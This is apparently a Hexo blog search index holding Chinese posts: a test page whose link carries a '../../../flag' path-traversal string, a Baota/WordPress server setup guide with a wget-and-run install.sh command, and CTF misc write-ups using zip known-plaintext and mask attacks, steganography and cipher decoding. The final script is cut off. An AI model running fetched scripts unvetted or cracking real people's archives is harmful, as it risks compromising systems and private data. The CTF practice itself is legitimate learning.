<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="2020/12/27/test/"/>
      <url>2020/12/27/test/</url>
      
        <content type="html"><![CDATA[<!DOCTYPE html><html><head><meta charset="utf-8" /><title>test</title></head><body><h1><a href="httpsssss://../../../../../../../../../../../../../flag"></a></h1></body></html>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>在云服务器上搭建博客（宝塔+WordPress）</title>
      <link href="2020/12/23/%E5%9C%A8%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E5%AE%9D%E5%A1%94+WordPress%EF%BC%89/"/>
      <url>2020/12/23/%E5%9C%A8%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E5%AE%9D%E5%A1%94+WordPress%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>准备：</p><p>一台能上网的电脑</p><p>阿里云服务器</p><p>FinalShell</p><a id="more"></a><br><p>电脑系统：win10</p><p>阿里云服务器系统镜像：CentOS 7.6</p><p>FinalShell版本：3.6.3</p><br><h2 id="连接云服务器"><a href="#连接云服务器" class="headerlink" title="连接云服务器"></a>连接云服务器</h2><p>用FinalShell连接云服务器（云服务器已实例）</p><p><img src="https://s3.ax1x.com/2020/12/23/rcMcsH.png"></p><p>点击<code>SSH连接(Linux)</code></p><p>名称随意，主机填云服务器的公网IP，用户名填root，密码填云服务器实例密码，点击确定</p><p><img src="https://s3.ax1x.com/2020/12/23/rcMbLj.png"></p><p>然后双击即可连接</p><br><h2 id="安装宝塔Linux面板"><a href="#安装宝塔Linux面板" class="headerlink" title="安装宝塔Linux面板"></a>安装宝塔Linux面板</h2><p><a href="https://www.bt.cn/bbs/thread-19376-1-1.html">宝塔Linux面板安装教程 - 2020年12月2日更新 - 7.4.6正式版</a></p><p>由于系统是CentOS的，复制CentOS安装指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y wget &amp;&amp; wget -O install.sh http:&#x2F;&#x2F;download.bt.cn&#x2F;install&#x2F;install_6.0.sh &amp;&amp; sh install.sh</span><br></pre></td></tr></table></figure><p>提示是否安装宝塔面板，输入 <code>y</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Do you want to install Bt-Panel to the &#x2F;www directory now?(y&#x2F;n):y</span><br></pre></td></tr></table></figure><p>安装完成后记录下外网面板地址以及username和password</p><p><img src="https://s3.ax1x.com/2020/12/23/rcQLcD.png"></p><br><h2 id="开通对应端口"><a href="#开通对应端口" class="headerlink" title="开通对应端口"></a>开通对应端口</h2><p>点击左侧的<code>实例</code>，点击对应的服务器</p><p>点击左侧的<code>本实例安全组</code>，点击<code>配置规则</code></p><p>点击<code>快速创建规则</code>，开通8888以及常用端口</p><p><img src="https://s3.ax1x.com/2020/12/23/rclgUI.png"></p><br><h2 id="创建站点"><a href="#创建站点" class="headerlink" title="创建站点"></a>创建站点</h2><p>访问外网面板地址，账号输入username，密码输入password</p><p>点击左边的<code>LNMP(推荐)</code>的<code>一键安装</code></p><p>安装完成后添加站点</p><p><img src="https://s3.ax1x.com/2020/12/24/rc1TSK.png"></p><p>域名可以用IP代替，根目录自己定义，添加MySQL数据库</p><p>点击提交即可</p><br><h2 id="安装WordPress"><a href="#安装WordPress" class="headerlink" title="安装WordPress"></a>安装WordPress</h2><p>安装WordPress官网：<a href="https://cn.wordpress.org/download/">https://cn.wordpress.org/download/</a></p><p>下载WordPress后上传到宝塔Linux面板</p><p><img src="https://s3.ax1x.com/2020/12/24/rc39l8.png"></p><p>解压到blog目录下</p><blockquote><p>直接解压的话是解压到wordpress文件夹里，复制粘贴到blog目录下即可</p></blockquote><p>访问域名进行安装，点击<code>现在就开始！</code></p><p>数据库名和用户名都是之前生成的数据库名，密码为数据库密码</p><blockquote><p>可在宝塔Linux面板点击左侧的数据库查看</p></blockquote><p>输入完成后点击提交</p><p>填写信息页面，站点标题随意，用户名和密码自己设置，电子邮件写自己的邮箱</p><p>点击<code>安装WordPress</code>，重新输入账号密码登录</p><p>此时进入的是WordPress的后台，可以在后台进行博客主题等相关设置</p><p>访问IP即可看到博客了，至此博客搭建完成</p><p><img src="https://s3.ax1x.com/2020/12/24/rc3D7d.png"></p>]]></content>
      
      
      <categories>
          
          <category> 其它 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其它 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复现3道misc题</title>
      <link href="2020/12/22/%E5%A4%8D%E7%8E%B03%E9%81%93misc%E9%A2%98/"/>
      <url>2020/12/22/%E5%A4%8D%E7%8E%B03%E9%81%93misc%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p><strong>目录</strong></p><ul><li>CISCN 2020 复赛(华南赛区) —— hidden_secret</li><li>安洵杯 2019 —— easy misc</li><li>SWPUCTF 2020 —— 耗子尾汁</li></ul><a id="more"></a><br><h2 id="hidden-secret"><a href="#hidden-secret" class="headerlink" title="hidden_secret"></a>hidden_secret</h2><p>题目：CISCN 2020 复赛（华南赛区）</p><p>参考：<a href="https://www.cnblogs.com/Lziyang/p/13741751.html">CISCN 复赛(华南赛区)部分wp - 迷失的老鼠 - 博客园 (cnblogs.com)</a></p><p>文件：<code>flag1.zip</code></p><br><p><code>flag1.zip</code>解压出来是一张图片（<code>hahah.jpg</code>）和一个压缩包（<code>hidden_secret.zip</code>）</p><p>图片好像没什么东西，压缩包解密需要密码</p><p>打开<code>hidden_secret.zip</code>，发现加密的文件里面也有<code>hahah.jpg</code>，而且crc校验值一样</p><p><img src="https://s3.ax1x.com/2020/11/15/DP4ciq.png" alt="DP4ciq.png"></p><p>用ARCHPR进行明文攻击</p><p><img src="https://s3.ax1x.com/2020/11/15/DP5Al8.png" alt="DP5Al8.png"></p><p><img src="https://s3.ax1x.com/2020/11/15/DP4OSK.png" alt="DP4OSK.png"></p><p>拿到了<code>hidden_secret.zip</code>的解压密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pb-1&#96;;ks</span><br></pre></td></tr></table></figure><p>解压后又是那个狗头，还有个<code>hidden_secret.rar</code>，继续解压</p><p>得到<code>key.gif</code></p><p>中途看到有一帧有二维码</p><p>用PS打开，在图层34查看图层</p><p><a href="https://imgchr.com/i/DP5v90"><img src="https://s3.ax1x.com/2020/11/15/DP5v90.png" alt="DP5v90.png"></a></p><p>扫码得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ni_chou_sha&#125;</span><br></pre></td></tr></table></figure><p>提交后发现不对😡</p><br><p>用stegsolve分析图像信息，可以发现这个gif动图的间隔时间分为10和20两种，考虑gif时间隐写</p><p>将所有间隔时间分离出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">identify -format &quot;%T&quot; key.gif</span><br></pre></td></tr></table></figure><p><img src="https://s3.ax1x.com/2020/11/15/DPTg74.png" alt="DPTg74.png"></p><p>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1020201020201020102010101020101010102020102010201020102020202020102020101020201010202020101020201020202010201010</span><br></pre></td></tr></table></figure><p>将<code>10</code>转化为<code>0</code>，<code>20</code>转化为<code>1</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&quot;1020201020201020102010101020101010102020102010201020102020202020102020101020201010202020101020201020202010201010&quot;</span>;</span><br><span class="line"></span><br><span class="line">$a = str_replace(<span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, $a);</span><br><span class="line">$a = str_replace(<span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, $a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01101101010001000011010101011111011001100111001101110100</span><br></pre></td></tr></table></figure><p>将<a href="http://www.ah888.org/wenben_binarystr.html">二进制转为字符串</a>，得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mD5_fst</span><br></pre></td></tr></table></figure><p>md5加密后得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">046cb65e60a4774c76b4f99371e66f0d</span><br></pre></td></tr></table></figure><p>根据题目提示ntfs，查看文件夹隐藏文件，在hidden_secret文件夹中发现隐藏文件</p><p><img src="https://s3.ax1x.com/2020/11/15/DPHwQ0.png" alt="DPHwQ0.png"></p><p>导出后重命名为<code>1.rar</code></p><p>解压密码为上面的MD5</p><p>解压得到<code>flag.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f935c5d0470757a3d2f3ee7467366f4e&#125;</span><br></pre></td></tr></table></figure><br><h2 id="easy-misc"><a href="#easy-misc" class="headerlink" title="easy misc"></a>easy misc</h2><p>题目：安洵杯 2019</p><p>参考：<a href="https://blog.csdn.net/m0_46481239/article/details/107915123">BUUCTF:[安洵杯 2019]easy misc_F10NA-CSDN博客</a></p><p>文件：<code>attachment.rar</code></p><br><p>解压之后有三个文件（夹）</p><p><img src="https://s3.ax1x.com/2020/11/28/D6MuvT.png"></p><p><code>decode.zip</code>为加密文件，但有注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG IN ((√2524921X85÷5+2)÷15-1794)+NNULLULL,</span><br></pre></td></tr></table></figure><p>算出来是7</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> (sqrt(<span class="number">2524921</span>)*<span class="number">85</span>/<span class="number">5</span>+<span class="number">2</span>)/<span class="number">15</span><span class="number">-1794</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用掩码攻击</p><p><img src="https://s3.ax1x.com/2020/11/28/D6Qmod.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2019456NNULLULL,</span><br></pre></td></tr></table></figure><p>解压后得到<code>decode.txt</code>，确认为<strong>字频隐写</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">a &#x3D; dIW</span><br><span class="line">b &#x3D; sSD</span><br><span class="line">c &#x3D; adE </span><br><span class="line">d &#x3D; jVf</span><br><span class="line">e &#x3D; QW8</span><br><span class="line">f &#x3D; SA&#x3D;</span><br><span class="line">g &#x3D; jBt</span><br><span class="line">h &#x3D; 5RE</span><br><span class="line">i &#x3D; tRQ</span><br><span class="line">j &#x3D; SPA</span><br><span class="line">k &#x3D; 8DS</span><br><span class="line">l &#x3D; XiE</span><br><span class="line">m &#x3D; S8S</span><br><span class="line">n &#x3D; MkF</span><br><span class="line">o &#x3D; T9p</span><br><span class="line">p &#x3D; PS5</span><br><span class="line">q &#x3D; E&#x2F;S</span><br><span class="line">r &#x3D; -sd</span><br><span class="line">s &#x3D; SQW</span><br><span class="line">t &#x3D; obW</span><br><span class="line">u &#x3D; &#x2F;WS</span><br><span class="line">v &#x3D; SD9</span><br><span class="line">w &#x3D; cw&#x3D;</span><br><span class="line">x &#x3D; ASD</span><br><span class="line">y &#x3D; FTa</span><br><span class="line">z &#x3D; AE7</span><br></pre></td></tr></table></figure><br><p>而在<code>read</code>文件夹里有大量txt文件，里面有个<code>hint.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint:取前16个字符</span><br></pre></td></tr></table></figure><p>但不知道是取哪个txt文件的前16高频字母</p><p>使用foremost分离<code>小姐姐.png</code>，得到</p><p><img src="https://s3.ax1x.com/2020/12/22/rsahbF.png"></p><p>使用盲水印工具分离：<a href="https://www.lizenghai.com/archives/72687.html">盲水印合成与解密</a></p><blockquote><p>安装不了opencv库，目前没有提取成功，据说是11.txt</p></blockquote><p>对11.txt进行字频分析：<a href="http://www.aihanyu.org/cncorpus/CpsTongji.aspx">http://www.aihanyu.org/cncorpus/CpsTongji.aspx</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">序号 字词出现次数   出现频率</span><br><span class="line">1 1720317.4123</span><br><span class="line">2e89389.0467</span><br><span class="line">3t62786.3544</span><br><span class="line">4a58495.9202</span><br><span class="line">5o53725.4374</span><br><span class="line">6n49324.992</span><br><span class="line">7r45254.5801</span><br><span class="line">8h44604.5143</span><br><span class="line">9s43474.3999</span><br><span class="line">10i42914.3432</span><br><span class="line">11d36403.6843</span><br><span class="line">12l33393.3796</span><br><span class="line">13u23082.3361</span><br><span class="line">14y19031.9262</span><br><span class="line">15g18511.8735</span><br><span class="line">16w17331.7541</span><br><span class="line">17c15061.5243</span><br><span class="line">18m14911.5091</span><br><span class="line">19.14231.4403</span><br><span class="line">20f12461.2612</span><br><span class="line">21　12031.2176</span><br><span class="line">22b11991.2136</span><br><span class="line">23,11811.1954</span><br><span class="line">24p11091.1225</span><br><span class="line">25k931    0.9423</span><br><span class="line">26&quot;  866  0.8765</span><br><span class="line">27&#39;7100.7186</span><br><span class="line">28H6030.6103</span><br><span class="line">29v5920.5992</span><br><span class="line">30-4500.4555</span><br><span class="line">31D3520.3563</span><br><span class="line">32I2810.2844</span><br><span class="line">33T2500.253</span><br><span class="line">34A1970.1994</span><br><span class="line">35P1940.1964</span><br><span class="line">36M1820.1842</span><br><span class="line">37?1520.1538</span><br><span class="line">38S1310.1326</span><br><span class="line">39W1240.1255</span><br><span class="line">40V1190.1204</span><br><span class="line">41U1170.1184</span><br><span class="line">42O1060.1073</span><br><span class="line">43!960.0972</span><br><span class="line">44G800.081</span><br><span class="line">45E760.0769</span><br><span class="line">46x760.0769</span><br><span class="line">47B740.0749</span><br><span class="line">48j740.0749</span><br><span class="line">49Y730.0739</span><br><span class="line">50z730.0739</span><br><span class="line">51N720.0729</span><br><span class="line">52C610.0617</span><br><span class="line">53R560.0567</span><br><span class="line">54L550.0557</span><br><span class="line">55F530.0536</span><br><span class="line">56q490.0496</span><br><span class="line">57;320.0324</span><br><span class="line">58K300.0304</span><br><span class="line">59:220.0223</span><br><span class="line">60(140.0142</span><br><span class="line">61)140.0142</span><br><span class="line">62J130.0132</span><br><span class="line">63150.0051</span><br><span class="line">64330.003</span><br><span class="line">65430.003</span><br><span class="line">66Q30.003</span><br><span class="line">67220.002</span><br><span class="line">68Z20.002</span><br><span class="line">69~10.001</span><br><span class="line">70010.001</span><br><span class="line">71710.001</span><br></pre></td></tr></table></figure><p>也可以使用脚本进行字频分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">&#x27;E:/11.txt&#x27;</span>)</span><br><span class="line">line = file.readlines()</span><br><span class="line">file.seek(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">file.close()</span><br><span class="line"></span><br><span class="line">result = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> line:</span><br><span class="line">find_line = re.findall(chr(i),j)</span><br><span class="line">count += len(find_line)</span><br><span class="line">result[chr(i)] = count</span><br><span class="line">res = sorted(result.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">num = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> res:</span><br><span class="line">print(<span class="string">&#x27;频数第&#123;0&#125;: &#x27;</span>.format(num),x)</span><br><span class="line">num += <span class="number">1</span> </span><br></pre></td></tr></table></figure><br><p>前16高频字符为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">etaonrhsidluygw</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QW8obWdIWT9pMkF-sd5RESQWtRQjVfXiE&#x2F;WSFTajBtcw&#x3D;</span><br></pre></td></tr></table></figure><p>编码后缀符号为<code>=</code>，猜测是base64</p><p>但标准base64只有64个字符（英文大小写、数字和+、/）以及用作后缀等号，并没有<code>r=-sd</code>的<code>-</code>，查了下发现题目出错了</p><p><img src="https://s3.ax1x.com/2020/12/23/ryWqeJ.png"></p><p>所以是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QW8obWdIWT9pMkFSQWtRQjVfXiE&#x2F;WSFTajBtcw&#x3D;</span><br></pre></td></tr></table></figure><p>base64解码后得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ao(mgHY?i2ARAkQB5_^!?Y!Sj0ms</span><br></pre></td></tr></table></figure><p>base85解码后得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;have_a_good_day1&#125;</span><br></pre></td></tr></table></figure><br><h2 id="耗子尾汁"><a href="#耗子尾汁" class="headerlink" title="耗子尾汁"></a>耗子尾汁</h2><p>题目：SWPUCTF 2020</p><p>参考：<a href="https://www.cnblogs.com/LEOGG321/archive/2004/01/13/14094598.html">SWPUCTF2020 Misc题解</a></p><p>文件：<code>hzwz.gif</code></p><p><img src="https://s3.ax1x.com/2020/12/23/ryfyfx.png"></p><p>binwalk提取一下，得到4个文件</p><p><img src="https://s3.ax1x.com/2020/12/23/ryhn41.png"></p><p><code>flag.txt</code>没有flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Th1s_1s_fa1se_f1ag&#125;</span><br><span class="line">上来就分离我合成的gif  这好吗？这不好！</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">啪的一下  很快啊  我全都防住了</span><br></pre></td></tr></table></figure><p><code>2^4_2^5_2^6.mp4</code>为闪电五连鞭的视频，中间有一帧画面有东西</p><blockquote><p><code>63E3A.zip</code>和<code>63F5F.zip</code>解压出来就是<code>2^4_2^5_2^6.mp4</code></p></blockquote><p><img src="https://s3.ax1x.com/2020/12/23/ry4BJ1.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c2lnbl9pbg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>base64解码为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sign_in</span><br></pre></td></tr></table></figure><p>把<code>2^4_2^5_2^6.mp4</code>拖到010editor，发现文件尾有个PK开头的压缩包，复制另存为1.zip</p><blockquote><p>也可以用kali自带的binwalk提取</p></blockquote><p><img src="https://s3.ax1x.com/2020/12/23/rcAtr6.png"></p><p>解压需要密码，将<code>sign_in</code>作为密码，解压得到19_20.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">R1pCVE9OUlhHVTNES05SWkdZWVRNUVJYSEEzVEtOUlVHNFpUT09KWEdFM0RLTlJZRzRaVE9RSlhHRTNEUU5aWkdaQkRNTlpXRzQzVEdOWlpHNDRUTVFaV0lJM1RNTlpXR1k0UT09PT0&#x3D;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;The last layer is the single table replacement password</span><br></pre></td></tr></table></figure><blockquote><p>翻译：最后一层是单表替换密码</p></blockquote><p>base64解码得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GZBTONRXGU3DKNRZGYYTMQRXHA3TKNRUG4ZTOOJXGE3DKNRYG4ZTOQJXGE3DQNZZGZBDMNZWG43TGNZZG44TMQZWII3TMNZWGY4Q&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>base32解码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6C76756569616B7875647379716568737A7168796B67677379796C6B767669</span><br></pre></td></tr></table></figure><p>十六进制转字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lvueiakxudsyqehszqhykggsyylkvvi</span><br></pre></td></tr></table></figure><br><p><code>19_20.txt</code>说最后一层是单表替换密码，而仿射密码是一种表单代换密码</p><p>根据文件名，设a=19，b=20</p><p>使用脚本进行仿射密码解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;lvueiakxudsyqehszqhykggsyylkvvi&quot;</span>.upper()</span><br><span class="line">a = <span class="number">19</span></span><br><span class="line">b = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k = a //b</span><br><span class="line">        remainder = a % b</span><br><span class="line">        x1, y1 = get(b, remainder)</span><br><span class="line">        x, y =y1, x1 - k * y1</span><br><span class="line">    <span class="keyword">return</span> x, y</span><br><span class="line"></span><br><span class="line">x, y = get(a, <span class="number">26</span>)</span><br><span class="line">a1 = x % <span class="number">26</span></span><br><span class="line"> </span><br><span class="line">l= len(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(l):</span><br><span class="line">    cipher = a1 * (ord(s[i])- <span class="number">65</span> - b) % <span class="number">26</span></span><br><span class="line">    res=chr(cipher + <span class="number">65</span>)</span><br><span class="line">    print(res.lower(), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagyouhavesignedinsuccessfully</span><br></pre></td></tr></table></figure><p>根据题目提示：flag格式flag{xxx_xxxx_xxxxxx_xx_xxxxxxxxxxxx}</p><p>加上下划线，得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;you_have_signed_in_successfully&#125;</span><br></pre></td></tr></table></figure><p>附：</p><p>仿射密码解密原始脚本：<a href="https://blog.csdn.net/x_yhy/article/details/83756908">仿射密码解密（Affine Cipher）</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#仿射密码解密</span></span><br><span class="line"><span class="comment">#改进欧几里得算法求线性方程的x与y</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k = a //b</span><br><span class="line">        remainder = a % b</span><br><span class="line">        x1, y1 = get(b, remainder)</span><br><span class="line">        x, y =y1, x1 - k * y1</span><br><span class="line">    <span class="keyword">return</span> x, y</span><br><span class="line"> </span><br><span class="line">s = input(<span class="string">&quot;请输入解密字符：&quot;</span>).upper()</span><br><span class="line">a = int(input(<span class="string">&quot;请输入a：&quot;</span>))</span><br><span class="line">b = int(input(<span class="string">&quot;请输入b：&quot;</span>))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#求a关于26的乘法逆元</span></span><br><span class="line">x, y = get(a, <span class="number">26</span>)</span><br><span class="line">a1 = x % <span class="number">26</span></span><br><span class="line"> </span><br><span class="line">l= len(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(l):</span><br><span class="line">    cipher = a1 * (ord(s[i])- <span class="number">65</span> - b) % <span class="number">26</span></span><br><span class="line">    res=chr(cipher + <span 